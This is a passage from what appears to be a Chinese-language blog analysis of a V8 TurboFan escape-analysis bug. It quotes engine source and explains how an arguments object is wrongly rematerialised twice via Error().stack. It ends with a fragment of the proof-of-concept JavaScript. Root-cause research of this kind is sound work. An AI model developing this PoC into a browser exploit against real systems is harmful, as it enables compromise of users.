</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> cached_parameters_[index];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>了解了这些来龙去脉，回头来仔细分析 JSCreateArguments 节点是怎么被优化掉的。</p>
<p>根据 turbolizer 显示的信息，JSCreateArguments 先是在 TypedLowering 阶段被优化成了实际的对象创建操作(以 FinishRegion 结尾的一系列节点组成)。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Reduction JSCreateLowering<span style="color:#f92672">::</span>ReduceJSCreateArguments(Node<span style="color:#f92672">*</span> node) {
</span></span><span style="display:flex;"><span>  DCHECK_EQ(IrOpcode<span style="color:#f92672">::</span>kJSCreateArguments, node<span style="color:#f92672">-&gt;</span>opcode());
</span></span><span style="display:flex;"><span>  CreateArgumentsType type <span style="color:#f92672">=</span> CreateArgumentsTypeOf(node<span style="color:#f92672">-&gt;</span>op());
</span></span><span style="display:flex;"><span>  FrameState frame_state{NodeProperties<span style="color:#f92672">::</span>GetFrameStateInput(node)};
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> control <span style="color:#f92672">=</span> graph()<span style="color:#f92672">-&gt;</span>start();
</span></span><span style="display:flex;"><span>  FrameStateInfo state_info <span style="color:#f92672">=</span> frame_state.frame_state_info();
</span></span><span style="display:flex;"><span>  SharedFunctionInfoRef shared <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      MakeRef(broker(), state_info.shared_info().ToHandleChecked());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Use the ArgumentsAccessStub for materializing both mapped and unmapped
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// arguments object, but only for non-inlined (i.e. outermost) frames.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (frame_state.outer_frame_state()<span style="color:#f92672">-&gt;</span>opcode() <span style="color:#f92672">!=</span> IrOpcode<span style="color:#f92672">::</span>kFrameState) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Use inline allocation for all mapped arguments objects within inlined
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// (i.e. non-outermost) frames, independent of the object size.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DCHECK_EQ(frame_state.outer_frame_state()<span style="color:#f92672">-&gt;</span>opcode(), IrOpcode<span style="color:#f92672">::</span>kFrameState);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (type) {
</span></span><span style="display:flex;"><span>	  ...
</span></span><span style="display:flex;"><span>	 <span style="color:#66d9ef">case</span> CreateArgumentsType<span style="color:#f92672">::</span>kUnmappedArguments: {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Use inline allocation for all unmapped arguments objects within inlined
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// (i.e. non-outermost) frames, independent of the object size.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Node<span style="color:#f92672">*</span> effect <span style="color:#f92672">=</span> NodeProperties<span style="color:#f92672">::</span>GetEffectInput(node);
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Choose the correct frame state and frame state info depending on
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// whether there conceptually is an arguments adaptor frame in the call
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// chain.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      FrameState args_state <span style="color:#f92672">=</span> GetArgumentsFrameState(frame_state);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (args_state.parameters()<span style="color:#f92672">-&gt;</span>opcode() <span style="color:#f92672">==</span> IrOpcode<span style="color:#f92672">::</span>kDeadValue) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// This protects against an incompletely propagated DeadValue node.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// If the FrameState has a DeadValue input, then this node will be
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// pruned anyway.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">NoChange</span>();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      FrameStateInfo args_state_info <span style="color:#f92672">=</span> args_state.frame_state_info();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> length <span style="color:#f92672">=</span> args_state_info.parameter_count() <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;  <span style="color:#75715e">// Minus receiver.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// Prepare element backing store to be used by arguments object.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Node<span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> elements <span style="color:#f92672">=</span> TryAllocateArguments(effect, control, args_state);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (elements <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) <span style="color:#66d9ef">return</span> NoChange();
</span></span><span style="display:flex;"><span>      effect <span style="color:#f92672">=</span> elements<span style="color:#f92672">-&gt;</span>op()<span style="color:#f92672">-&gt;</span>EffectOutputCount() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> elements : effect;
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Load the arguments object map.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Node<span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> arguments_map <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          jsgraph()<span style="color:#f92672">-&gt;</span>Constant(native_context().strict_arguments_map());
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Actually allocate and initialize the arguments object.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      AllocationBuilder <span style="color:#a6e22e">a</span>(jsgraph(), effect, control);
</span></span><span style="display:flex;"><span>      STATIC_ASSERT(JSStrictArgumentsObject<span style="color:#f92672">::</span>kSize <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> kTaggedSize);
</span></span><span style="display:flex;"><span>      a.Allocate(JSStrictArgumentsObject<span style="color:#f92672">::</span>kSize);
</span></span><span style="display:flex;"><span>      a.Store(AccessBuilder<span style="color:#f92672">::</span>ForMap(), arguments_map);
</span></span><span style="display:flex;"><span>      a.Store(AccessBuilder<span style="color:#f92672">::</span>ForJSObjectPropertiesOrHashKnownPointer(),
</span></span><span style="display:flex;"><span>              jsgraph()<span style="color:#f92672">-&gt;</span>EmptyFixedArrayConstant());
</span></span><span style="display:flex;"><span>      a.Store(AccessBuilder<span style="color:#f92672">::</span>ForJSObjectElements(), elements);
</span></span><span style="display:flex;"><span>      a.Store(AccessBuilder<span style="color:#f92672">::</span>ForArgumentsLength(), jsgraph()<span style="color:#f92672">-&gt;</span>Constant(length));
</span></span><span style="display:flex;"><span>      RelaxControls(node);
</span></span><span style="display:flex;"><span>      a.FinishAndChange(node);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Changed</span>(node);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  UNREACHABLE();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>优化过后 JSCreateArguments 就被展开成了下面这些 Allocate 和 StoreField 节点。</p>
<p>![[Pasted image 20230816223925.png]]</p>
<p>![[Pasted image 20230816224756.png]]</p>
<p>之后这个状态一直保持到了逃逸分析 EscapeAnalysis 阶段，在逃逸分析阶段被优化成了下图的样子。</p>
<p>![[Pasted image 20230816232212.png]]</p>
<p><a href="https://en.wikipedia.org/wiki/Escape_analysis">逃逸分析</a>是一种编译优化手段，简单来说如果编译器分析出一个对象只在某个范围内，例如一个函数内部，被创建并使用，那么就可以对它进行一些优化，例如本来应该在堆上分配的对象，如果只在函数内部使用就可以优化到栈上，这种情况可以称为被捕获。反过来如果编译器不能分析出对象只在特定范围内被使用，就可以说对象是逃逸的。推测是编译器分析出 arguments 对象只在函数内部使用，所以对它进行了一些优化。</p>
<p>下面来调试了一下逃逸分析，验证一下我的推测。调试发现 kFinishRegion 节点是在 <code>EscapeAnalysisReducer::ReduceDeoptState</code> 函数中被替换成 kObjectId 的，在处理 FrameState 以及其关联节点的过程中，发现 kFinishRegion 对应的对象是没有逃逸的，所以直接把 kFinishRegion 替换成了 ObjectState 和 kObjectId 节点。这里要注意 FrameState 节点处理流程中的 for 循环的遍历顺序，是先处理 kFrameStateOuterStateInput，之后才处理 kFrameStateParametersInput，所以 OuterFrameState 中的 kFinishRegion 节点被替换成了 ObjectState，而 kFrameStateParametersInput 中的 kFinishRegion 节点被替换成了 ObjectId。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span>Node<span style="color:#f92672">*</span> EscapeAnalysisReducer<span style="color:#f92672">::</span>ReduceDeoptState(Node<span style="color:#f92672">*</span> node, Node<span style="color:#f92672">*</span> effect,
</span></span><span style="display:flex;"><span>                                              Deduplicator<span style="color:#f92672">*</span> deduplicator) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (node<span style="color:#f92672">-&gt;</span>opcode() <span style="color:#f92672">==</span> IrOpcode<span style="color:#f92672">::</span>kFrameState) {
</span></span><span style="display:flex;"><span>    NodeHashCache<span style="color:#f92672">::</span>Constructor new_node(<span style="color:#f92672">&amp;</span>node_cache_, node);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// This input order is important to match the DFS traversal used in the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// instruction selector. Otherwise, the instruction selector might find a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// duplicate node before the original one.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 注意这里的遍历顺序, 是先从 kFrameStateOuterStateInput 开始, 所以
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> input_id : {FrameState<span style="color:#f92672">::</span>kFrameStateOuterStateInput,
</span></span><span style="display:flex;"><span>                         FrameState<span style="color:#f92672">::</span>kFrameStateFunctionInput,
</span></span><span style="display:flex;"><span>                         FrameState<span style="color:#f92672">::</span>kFrameStateParametersInput,
</span></span><span style="display:flex;"><span>                         FrameState<span style="color:#f92672">::</span>kFrameStateContextInput,
</span></span><span style="display:flex;"><span>                         FrameState<span style="color:#f92672">::</span>kFrameStateLocalsInput,
</span></span><span style="display:flex;"><span>                         FrameState<span style="color:#f92672">::</span>kFrameStateStackInput}) {
</span></span><span style="display:flex;"><span>      Node<span style="color:#f92672">*</span> input <span style="color:#f92672">=</span> node<span style="color:#f92672">-&gt;</span>InputAt(input_id);
</span></span><span style="display:flex;"><span>      new_node.ReplaceInput(ReduceDeoptState(input, effect, deduplicator),
</span></span><span style="display:flex;"><span>                            input_id);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> new_node.Get();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (node<span style="color:#f92672">-&gt;</span>opcode() <span style="color:#f92672">==</span> IrOpcode<span style="color:#f92672">::</span>kStateValues) {
</span></span><span style="display:flex;"><span>    NodeHashCache<span style="color:#f92672">::</span>Constructor new_node(<span style="color:#f92672">&amp;</span>node_cache_, node);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> node<span style="color:#f92672">-&gt;</span>op()<span style="color:#f92672">-&gt;</span>ValueInputCount(); <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>      Node<span style="color:#f92672">*</span> input <span style="color:#f92672">=</span> NodeProperties<span style="color:#f92672">::</span>GetValueInput(node, i);
</span></span><span style="display:flex;"><span>      new_node.ReplaceValueInput(ReduceDeoptState(input, effect, deduplicator),
</span></span><span style="display:flex;"><span>                                 i);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> new_node.Get();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (<span style="color:#66d9ef">const</span> VirtualObject<span style="color:#f92672">*</span> vobject <span style="color:#f92672">=</span> analysis_result().GetVirtualObject(
</span></span><span style="display:flex;"><span>                 SkipValueIdentities(node))) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (vobject<span style="color:#f92672">-&gt;</span>HasEscaped()) <span style="color:#66d9ef">return</span> node;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (deduplicator<span style="color:#f92672">-&gt;</span>SeenBefore(vobject)) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> ObjectIdNode(vobject); <span style="color:#75715e">//&lt;&lt;&lt;&lt;&lt; 这里
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>Node<span style="color:#f92672">*&gt;</span> inputs;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; offset <span style="color:#f92672">&lt;</span> vobject<span style="color:#f92672">-&gt;</span>size(); offset <span style="color:#f92672">+=</span> kTaggedSize) {
</span></span><span style="display:flex;"><span>        Node<span style="color:#f92672">*</span> field <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>            analysis_result().GetVirtualObjectField(vobject, offset, effect);
</span></span><span style="display:flex;"><span>        CHECK_NOT_NULL(field);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (field <span style="color:#f92672">!=</span> jsgraph()<span style="color:#f92672">-&gt;</span>Dead()) {
</span></span><span style="display:flex;"><span>          inputs.push_back(ReduceDeoptState(field, effect, deduplicator));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> num_inputs <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(inputs.size());
</span></span><span style="display:flex;"><span>      NodeHashCache<span style="color:#f92672">::</span>Constructor new_node(
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&amp;</span>node_cache_,
</span></span><span style="display:flex;"><span>          jsgraph()<span style="color:#f92672">-&gt;</span>common()<span style="color:#f92672">-&gt;</span>ObjectState(vobject<span style="color:#f92672">-&gt;</span>id(), num_inputs),
</span></span><span style="display:flex;"><span>          num_inputs, <span style="color:#f92672">&amp;</span>inputs.front(), NodeProperties<span style="color:#f92672">::</span>GetType(node));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> new_node.Get();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> node;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>上面这部分代码只负责节点的替换，而是节点的分析过程是在 <code>EscapeAnalysis::ReduceNode</code> 函数进行的：</p>
<ul>
<li>kAllocate：创建一个虚拟对象来追踪的状态</li>
<li>kFinishRegion： 把 ValueInput(0) 处 kAllocate 节点的虚拟对象传递下去.</li>
<li>kStoreField：如果是赋值到被捕获的对象, 在虚拟对象里记录源操作数，省略本次写操作</li>
<li>kLoadField：如果源操作数是被捕获的对象，直接从对应的虚拟对象里找到之前记录的值，省略本次读操作</li>
<li>kFrameState, kStateValues: 被这两个节点使用不影响逃逸状态</li>
<li>其他节点：标记输入节点为逃逸</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ReduceNode</span>(<span style="color:#66d9ef">const</span> Operator<span style="color:#f92672">*</span> op, EscapeAnalysisTracker<span style="color:#f92672">::</span>Scope<span style="color:#f92672">*</span> current,
</span></span><span style="display:flex;"><span>                JSGraph<span style="color:#f92672">*</span> jsgraph) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (op<span style="color:#f92672">-&gt;</span>opcode()) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kAllocate: {
</span></span><span style="display:flex;"><span>      NumberMatcher size(current<span style="color:#f92672">-&gt;</span>ValueInput(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>size.HasResolvedValue()) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> size_int <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(size.ResolvedValue());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (size_int <span style="color:#f92672">!=</span> size.ResolvedValue()) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">const</span> VirtualObject<span style="color:#f92672">*</span> vobject <span style="color:#f92672">=</span> current<span style="color:#f92672">-&gt;</span>InitVirtualObject(size_int)) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Initialize with dead nodes as a sentinel for uninitialized memory.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">for</span> (Variable field : <span style="color:#f92672">*</span>vobject) {
</span></span><span style="display:flex;"><span>          current<span style="color:#f92672">-&gt;</span>Set(field, jsgraph<span style="color:#f92672">-&gt;</span>Dead());
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kFinishRegion:
</span></span><span style="display:flex;"><span>      current<span style="color:#f92672">-&gt;</span>SetVirtualObject(current<span style="color:#f92672">-&gt;</span>ValueInput(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kStoreField: {
</span></span><span style="display:flex;"><span>      Node<span style="color:#f92672">*</span> object <span style="color:#f92672">=</span> current<span style="color:#f92672">-&gt;</span>ValueInput(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>      Node<span style="color:#f92672">*</span> value <span style="color:#f92672">=</span> current<span style="color:#f92672">-&gt;</span>ValueInput(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> VirtualObject<span style="color:#f92672">*</span> vobject <span style="color:#f92672">=</span> current<span style="color:#f92672">-&gt;</span>GetVirtualObject(object);
</span></span><span style="display:flex;"><span>      Variable var;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (vobject <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>vobject<span style="color:#f92672">-&gt;</span>HasEscaped() <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>          vobject<span style="color:#f92672">-&gt;</span>FieldAt(OffsetOfFieldAccess(op)).To(<span style="color:#f92672">&amp;</span>var)) {
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>Set(var, value);
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>MarkForDeletion();
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>SetEscaped(object);
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>SetEscaped(value);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kLoadField: {
</span></span><span style="display:flex;"><span>      Node<span style="color:#f92672">*</span> object <span style="color:#f92672">=</span> current<span style="color:#f92672">-&gt;</span>ValueInput(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> VirtualObject<span style="color:#f92672">*</span> vobject <span style="color:#f92672">=</span> current<span style="color:#f92672">-&gt;</span>GetVirtualObject(object);
</span></span><span style="display:flex;"><span>      Variable var;
</span></span><span style="display:flex;"><span>      Node<span style="color:#f92672">*</span> value;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (vobject <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>vobject<span style="color:#f92672">-&gt;</span>HasEscaped() <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>          vobject<span style="color:#f92672">-&gt;</span>FieldAt(OffsetOfFieldAccess(op)).To(<span style="color:#f92672">&amp;</span>var) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>          current<span style="color:#f92672">-&gt;</span>Get(var).To(<span style="color:#f92672">&amp;</span>value)) {
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>SetReplacement(value);
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>SetEscaped(object);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kStateValues:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kFrameState:
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// These uses are always safe.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// For unknown nodes, treat all value inputs as escaping.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">int</span> value_input_count <span style="color:#f92672">=</span> op<span style="color:#f92672">-&gt;</span>ValueInputCount();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> value_input_count; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>        Node<span style="color:#f92672">*</span> input <span style="color:#f92672">=</span> current<span style="color:#f92672">-&gt;</span>ValueInput(i);
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>SetEscaped(input);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (OperatorProperties<span style="color:#f92672">::</span>HasContextInput(op)) {
</span></span><span style="display:flex;"><span>        current<span style="color:#f92672">-&gt;</span>SetEscaped(current<span style="color:#f92672">-&gt;</span>ContextInput());
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> VirtualObject<span style="color:#f92672">*</span> <span style="color:#a6e22e">InitVirtualObject</span>(<span style="color:#66d9ef">int</span> size) {
</span></span><span style="display:flex;"><span>  DCHECK_EQ(IrOpcode<span style="color:#f92672">::</span>kAllocate, current_node()<span style="color:#f92672">-&gt;</span>opcode());
</span></span><span style="display:flex;"><span>  VirtualObject<span style="color:#f92672">*</span> vobject <span style="color:#f92672">=</span> tracker_<span style="color:#f92672">-&gt;</span>virtual_objects_.Get(current_node());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (vobject) {
</span></span><span style="display:flex;"><span>	CHECK(vobject<span style="color:#f92672">-&gt;</span>size() <span style="color:#f92672">==</span> size);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	vobject <span style="color:#f92672">=</span> tracker_<span style="color:#f92672">-&gt;</span>NewVirtualObject(size);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (vobject) vobject<span style="color:#f92672">-&gt;</span>AddDependency(current_node());
</span></span><span style="display:flex;"><span>  vobject_ <span style="color:#f92672">=</span> vobject;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> vobject;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">SetVirtualObject</span>(Node<span style="color:#f92672">*</span> object) {
</span></span><span style="display:flex;"><span>  vobject_ <span style="color:#f92672">=</span> tracker_<span style="color:#f92672">-&gt;</span>virtual_objects_.Get(object);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">~</span>Scope() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (replacement_ <span style="color:#f92672">!=</span> tracker_<span style="color:#f92672">-&gt;</span>replacements_[current_node()] <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>	  vobject_ <span style="color:#f92672">!=</span> tracker_<span style="color:#f92672">-&gt;</span>virtual_objects_.Get(current_node())) {
</span></span><span style="display:flex;"><span>	reduction()<span style="color:#f92672">-&gt;</span>set_value_changed();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  tracker_<span style="color:#f92672">-&gt;</span>replacements_[current_node()] <span style="color:#f92672">=</span> replacement_;
</span></span><span style="display:flex;"><span>  tracker_<span style="color:#f92672">-&gt;</span>virtual_objects_.Set(current_node(), vobject_); 
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>分析完成后，<code>Reduction EscapeAnalysisReducer::Reduce(Node* node)</code> 根据之前的分析结果修改 IR, <code>EscapeAnalysisReducer::ReduceDeoptState</code> 就是在这个阶段被调用的。</p>
<p>分析了这么一大圈，在回过头来看 POC 代码, 终于理解了漏洞发生的原因，C(3) 的返回值是 b.a.call(arguments, b), 中的 arguments，由于这个对象是被函数捕获的，所以在 turbofan 编译过程中被优化掉了，在 turbofan 生成的代码中没有创建，C() 中使用 Error().stack 触发了这个对象的创建，但是创建的代码中有 BUG，多次 Error().stack 获取这个 arguments 对象时，每次都新创建一个出来，导致原本应该是指向同一个对象的 e.M 和 e.C 指向了两个不同的对象。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">C</span>(<span style="color:#a6e22e">z</span>) {
</span></span><span style="display:flex;"><span>    Error.<span style="color:#a6e22e">prepareStackTrace</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">B</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">B</span>[<span style="color:#a6e22e">z</span>].<span style="color:#a6e22e">getThis</span>();
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> Error().<span style="color:#a6e22e">stack</span>;
</span></span><span style="display:flex;"><span>    Error.<span style="color:#a6e22e">prepareStackTrace</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">p</span>;
</span></span><span style="display:flex;"><span>  }
